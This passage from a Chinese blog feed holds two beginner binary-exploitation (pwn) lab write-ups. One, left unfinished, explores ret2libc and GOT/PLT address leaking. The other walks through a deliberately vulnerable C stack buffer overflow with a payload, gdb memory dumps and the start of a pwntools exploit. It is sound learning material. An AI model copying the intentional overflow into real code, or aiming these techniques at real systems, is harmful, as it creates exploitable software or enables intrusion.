&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Can you find it !?no
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="反编译分析-5">反编译分析&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152800977.png"
width="465"
height="278"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152800977_hu78b695f3faf4d54db28e6261c3b5e7e1_12160_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152800977_hu78b695f3faf4d54db28e6261c3b5e7e1_12160_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824152800977"
class="gallery-image"
data-flex-grow="167"
data-flex-basis="401px"
>&lt;/p>
&lt;p>查看 plt 发现确实没有 &lt;code>system&lt;/code> 函数。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc3 | grep system
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 »
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>能不能用 &lt;code>ret2syscall&lt;/code> 的技巧呢？&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc3 --only &amp;#39;pop|ret&amp;#39; 1 ↵
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Gadgets information
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">============================================================
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x080486ff : pop ebp ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x080486fc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0804841d : pop ebx ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x080486fe : pop edi ; pop ebp ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x080486fd : pop esi ; pop edi ; pop ebp ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x08048406 : ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0804854e : ret 0xeac1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Unique gadgets found: 7
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>很遗憾，缺乏控制 &lt;code>ecx&lt;/code> 和 &lt;code>edx&lt;/code> 寄存器的 gadget 。直接快进到找 &lt;code>system&lt;/code> 地址。学习一下 ctf-wiki 上关于找 libc 里地址的方法。装个 &lt;code>libcsearcher&lt;/code>，整理下思路。&lt;/p>
&lt;p>取得&lt;code>system&lt;/code>函数的原理是利用 &lt;code>libc.so&lt;/code> 库函数之间相对偏移确定这一点，只要已知 libc 版本和一个 libc 函数的地址，即可推算出其他 libc 函数的地址。利用这一原理取得 libc 地址需要先知道当前 libc 版本和一个已知地址。&lt;/p>
&lt;p>取得已知地址则又需要一点点技巧，因为 GOT 是延迟绑定的。也就是说，只有在第一次调用后，GOT 里填充的值才是真正的地址。在第一次调用前，里面填充其实是 PLT 的地址。我们用代码说话。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">08048490 &amp;lt;__libc_start_main@plt&amp;gt;:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048490: ff 25 24 a0 04 08 jmp *0x804a024
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8048496: 68 30 00 00 00 push $0x30
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 804849b: e9 80 ff ff ff jmp 8048420 &amp;lt;.plt&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>jmp *0x804a024&lt;/code>，&lt;code>0x804a024&lt;/code>是 GOT 上 &lt;code>__libc_start_main&lt;/code> 的地址，在第一次调用前，这个地址上填充的值实际是 &lt;code>0x8048496&lt;/code>，也就是 &lt;code>__libc_start_main@plt&lt;/code> 第二条指令 &lt;code>push $0x30&lt;/code> 的地址。&lt;/p>
&lt;p>而后的 &lt;code>push&lt;/code>和 &lt;code>jmp&lt;/code> 最终会调用 &lt;code>_dl_runtime_resolve&lt;/code> 函数（&lt;code>.got.plt&lt;/code>第三项）完成解析，填充 GOT 并返回。&lt;/p>
&lt;p>这玩意儿和 PE 文件的 IAT 性质是一样的，只是PE少一步延迟链接。&lt;/p>
&lt;p>综上所述随便拿一个GOT表项的值是不行的，因为里面的地址可能是 PLT 的地址而不是真实 libc 函数的地址。&lt;/p>
&lt;h2 id="烂尾总结">烂尾总结&lt;/h2>
&lt;p>续于 2022年12月31日。&lt;/p>
&lt;p>整理草稿箱的时候发现了这篇写了一半的博客。这篇应该是在六七月开始写的，写了大半，结果工作一忙，完全忘了。这会儿思路也续不上，干脆就弃坑了。&lt;/p>
&lt;p>就这样吧，叹口气，但不管怎么着生活还得继续。&lt;/p></description></item><item><title>入门pwn</title><link>https://nnnewb.github.io/blog/p/%E5%85%A5%E9%97%A8pwn/</link><pubDate>Thu, 18 Aug 2022 17:52:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%85%A5%E9%97%A8pwn/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>经过很长一段时间的学习（理解为浪费时间即可），终于能简单过个 pwn 的 demo 了。于是水一篇博客记录一下。&lt;/p>
&lt;h2 id="准备">准备&lt;/h2>
&lt;p>建立一个 pwn 文件夹做工作区，初始化一个 python 环境，装好 &lt;code>pwntools&lt;/code> ，虽然还不怎么用得到。题目来源是 &lt;a class="link" href="https://ctf101.org/binary-exploitation/buffer-overflow/" target="_blank" rel="noopener"
>ctf101 binary-exploitation buffer-overflow&lt;/a>，源码略做修改。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">volatile&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x12345678&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;buffer: %p, secret: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">secret&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// ! dangerous !
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">secret&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;cool!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;that&amp;#39;s not cool enough.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>漏洞行已经标注出。题意比较清楚，通过 &lt;code>read(0,buffer,0x100)&lt;/code> 溢出覆写 &lt;code>secret&lt;/code>，来通过后续的检查。&lt;code>volatile&lt;/code>是为了避免被优化成寄存器变量，不过指定 &lt;code>-O0&lt;/code> 的时候加不加&lt;code>volatile&lt;/code>都无所谓。&lt;/p>
&lt;p>简单写个 &lt;code>Makefile&lt;/code> 编译出 32 和 64 位两个版本，之后也会写两个 exp 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-makefile" data-lang="makefile">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">all&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">question&lt;/span>32 &lt;span class="n">question&lt;/span>64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">question32&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">question&lt;/span>.&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> gcc $^ -m32 -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question32
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">question64&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">question&lt;/span>.&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> gcc $^ -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question64
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>比较重要的是 &lt;code>-fno-stack-protector&lt;/code>，不加的话会在溢出 &lt;code>buffer&lt;/code> 的时候触发 stack canary 检测，直接报 &lt;code>stack smashing detected&lt;/code> 后退出。不过 32 位似乎没这个问题。&lt;/p>
&lt;p>再创建 &lt;code>exploit32.py&lt;/code>和&lt;code>exploit64.py&lt;/code>两个文件用来保存我们的exploit脚本，准备工作就算结束了。&lt;/p>
&lt;h2 id="缓冲区溢出">缓冲区溢出&lt;/h2>
&lt;h3 id="原理">原理&lt;/h3>
&lt;p>引用自 &lt;a class="link" href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow" target="_blank" rel="noopener"
>ired.team binary exploitation&lt;/a> ：&lt;/p>
&lt;blockquote>
&lt;p>At a high level, exploiting a buffer overflow boils down to the following key points:&lt;/p>
&lt;ul>
&lt;li>Attacker overflows vulnerable program&amp;rsquo;s memory buffer by writing to it more data (including the malicious code, usually shellcode) than the program anticipated, but did nothing (bound checking) to prevent it from happening;&lt;/li>
&lt;li>When a memory buffer is overflowed, the adjacent memory in the vulnerable program is replaced with malicious content supplied by an attacker;&lt;/li>
&lt;li>Attacker subverts the vulnerable program and forces it to execute the malicious code, which was written to the compromised program&amp;rsquo;s memory, when the program&amp;rsquo;s memory buffer was overflowed;&lt;/li>
&lt;li>The vulnerable program starts executing malicious code, and depending on what the vulnerable program is/what security context it runs in and whether it is being exploited locally or over the network, results in attacker escalating their privileges on an already compromised system or provides them with a remote access to system being exploited.&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>简而言之，就是通过覆写内存，操纵程序的控制流，运行攻击者的恶意代码或窃取数据。&lt;/p>
&lt;h3 id="32位栈上缓冲区溢出">32位栈上缓冲区溢出&lt;/h3>
&lt;p>分析案例代码，&lt;code>buffer&lt;/code>和&lt;code>secret&lt;/code>是栈上相邻的变量，从声明顺序盲猜&lt;code>secret&lt;/code>在更接近栈底的位置（高地址），&lt;code>buffer&lt;/code>在更接近栈顶的位置（低地址）。x86体系结构下栈从高地址向低地址增长，&lt;code>&amp;amp;buffer[0]&lt;/code>是栈顶，则&lt;code>&amp;amp;buffer[100]&lt;/code>就是&lt;code>secret&lt;/code>的地址了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747.png"
width="269"
height="295"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747_hu50e363e090a2d910723c71e4f22316ac_35941_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747_hu50e363e090a2d910723c71e4f22316ac_35941_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220815163807747"
class="gallery-image"
data-flex-grow="91"
data-flex-basis="218px"
>&lt;/p>
&lt;p>&lt;code>read(STDIN_FILENO, buffer, 0x100)&lt;/code> 从标准输入读取 &lt;code>0x100&lt;/code> 个字节，从 &lt;code>&amp;amp;buffer[0]&lt;/code> 开始写入。因为边界检查失效（写入长度&lt;code>0x100&lt;/code>大于&lt;code>buffer[100]&lt;/code>长度），只要我们提供 &lt;code>104&lt;/code> 个字节的输入，最后四个字节就会覆盖 &lt;code>secret&lt;/code> 变量的值。&lt;/p>
&lt;p>为了验证上面的说法，可以先创建一个 payload 文件作为 &lt;code>question32&lt;/code> 的输入。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;payload32.bin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;wb+&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x41&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">104&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>接下来使用 gdb 观察读取输入前后的栈数据。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Reading symbols from question32...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) b question.c:8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 1 at 0x1214: file question.c, line 8.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) b question.c:9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 2 at 0x122a: file question.c, line 9.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) r &amp;lt; payload32.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting program: /home/weakptr/repos/pwn/lab-1/question32 &amp;lt; payload32.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[Thread debugging using libthread_db enabled]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using host libthread_db library &amp;#34;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;#34;.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">buffer: 0xffffd058, secret: 0xffffd0bc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 1, main () at question.c:8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8 read(STDIN_FILENO, buffer, 0x100);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) x/32x $esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd050: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd060: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd070: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd080: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd090: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0a0: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0b0: 0x00000000 0x00000000 0x00000000 *0x12345678*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0c0: 0xffffd100 0xf7fbe66c 0xf7fbeb20 0xffffd0f0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>观察第 21 行，&lt;code>0xffffd0bc&lt;/code> 处，&lt;code>0x12345678&lt;/code>，就是 &lt;code>question.c&lt;/code> 中初始化的 &lt;code>secret&lt;/code> 了。而从 &lt;code>0xffffd0508&lt;/code>到&lt;code>0xffffd0bc&lt;/code>就是&lt;code>buffer&lt;/code>的内容。&lt;/p>
&lt;p>我们继续执行到 &lt;code>read&lt;/code> 这一行后。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(gdb) next
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 2, main () at question.c:9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9 if (secret == 0x1234) {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) x/32x $esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd050: 0x00000000 0x00000000 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd060: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd070: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd080: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd090: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0a0: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0b0: 0x41414141 0x41414141 0x41414141 *0x41414141*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0c0: 0xffffd100 0xf7fbe66c 0xf7fbeb20 0xffffd0f0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) p /x secret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$2 = 0x41414141
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>观察到 &lt;code>secret&lt;/code> 被覆盖为 &lt;code>0x41414141&lt;/code>。&lt;/p>
&lt;p>现在只需要把 payload32.bin 中最后四个字节改成预期的 &lt;code>secret&lt;/code> 值 &lt;code>0x1234&lt;/code> 即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;@l&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span>
